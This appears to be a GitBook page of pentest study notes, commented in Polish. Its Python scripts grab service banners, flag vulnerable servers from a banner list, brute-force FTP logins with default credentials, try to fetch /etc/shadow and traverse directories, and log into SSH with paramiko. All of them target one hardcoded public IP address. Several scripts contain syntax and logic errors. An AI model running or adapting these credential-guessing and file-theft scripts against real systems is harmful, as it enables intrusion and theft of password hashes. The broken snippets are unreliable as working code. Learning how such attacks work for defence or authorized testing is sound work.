---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# paramiko/FTP/SSH

**port scanner**

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (20).jpg" alt=""><figcaption></figcaption></figure>

</div>

```python
import socket

sock=socket.socket()
ip="146.59.35.163"
ports=[21,22,25,80]

for port in ports:
  sock.connect((ip,port))
  sock.send("aa".encode())
  sock.settimeout(4)
  info = sock.recv(2048).decode()
  print(info)
  sock.close()
```

```python
import socket

def grab(ip_address, port):
  try:  
    s=socket.socket()
    s.connect((ip_address,port))
    banner=s.recv(1024)
    s.close()
    return banner
  except: 
    return''
    
def main():
  ports=[22,21,80]
  for port in ports:
    ip_address="146.59.35.163"
    print(f"on {port} : {grab(ip_address,port)}")
    
if __name__=='__main__':
  main()
```

{% code fullWidth="true" %}
```python
import socket
import argparse
import re
parser = argparse.ArgumentParser(description = 'Odczytanie banera serwera')
# Parametry
parser.add_argument("--target", dest = "target", help = "adres IP", required = True)
parser.add_argument("--port", dest = "port", help = "port", type = int, required = True)
parsed_args = parser.parse_args()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((parsed_args.target, parsed_args.port))
sock.settimeout(2)
query = "GET / HTTP/1.1\nHost: " + parsed_args.target + "\n\n"
http_get = bytes(query, 'utf-8')
data = ''
### plik banery musi być w systemie
with open('banery.txt', 'r') as file:
    vulnbanners = file.readlines()
try:
    sock.sendall(http_get)
    data = sock.recvfrom(1024)
    data = data[0]
    print(data)
    headers = data.splitlines()
    for header in headers:
        try:
            if re.search('Serwer:', str(header)):
                print("*****" + header.decode("utf-8") + "*****")
            else:
                print(header.decode("utf-8"))
        except Exception as exception:
            pass
        for vulnbanner in vulnbanners:
            if vulnbanner.strip() in str(data.strip().decode("utf-8")):
                print('Serwer jest zagrożony!', vulnbanner)
                print('Adres: ' + str(parsed_args.target))
                print('Port: ' + str(parsed_args.port))
except socket.error:
    print ("Błąd gniazda", socket.errno)
finally:
    sock.close()
```
{% endcode %}

**FTP**

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (21).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/2 (11).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/3 (6).jpg" alt=""><figcaption></figcaption></figure>

</div>

```python
import ftplib
users=["ubuntu","root","adam"]
passwords=["admin","ubuntu","123456"]

#with open("users.txt") as f:
#  usernames=f.read().splitlines()

ftp_client=ftplib.FTP()
#print(ftp_client.getwelcome())
for user in users:
  for password in passwords:
    try
      ftp_client.connect("146.59.35.163",21,timeout=2)
      print(ftp_client.getwelcome())
      print(ftp_client.login(user,password))
      print(f":) {user}:{password}")
      ftp_client.retrbinary("/etc/shadow",open("shadow_attack.txt","wb").write())
      ftp_client.cwd("../../../../../../../")
      ftp_client.voidcmd("TYPE 1")
      ftp_client.nlst()
      ftp_client.size()
    except Exception as e:
      print(f"{e} dla {user}:{password}")
```

**SSH**

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (22).jpg" alt=""><figcaption></figcaption></figure>

</div>

sudo apt install openssh

sudo service ssh start

sudo service ssh status

pip install paramiko

```python
import paramiko
import getpass

target="146.59.35.163"
user="ubuntu"
password=getpass.getpass() #input()
try:
  ssh_client=paramiko.SSHClient()
  paramiko.common.logging.basicConfig(level = paramiko.common.DEBUG)
  ssh_client.load_system_host_keys()
  ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  rsp=ssh_client.connect(target,port = 22, username = user, password = password)
  print(rsp)
  stdin, stdout, stderr = ssh_client.exec_command("ls -al")
  print(stdout.read().decode()
  transport=ssh_client.get_transport()
  sec_opt=transport.get_security_options()
  print(sec_opt.ciphers)
except Exception as e:
  print(e)
```
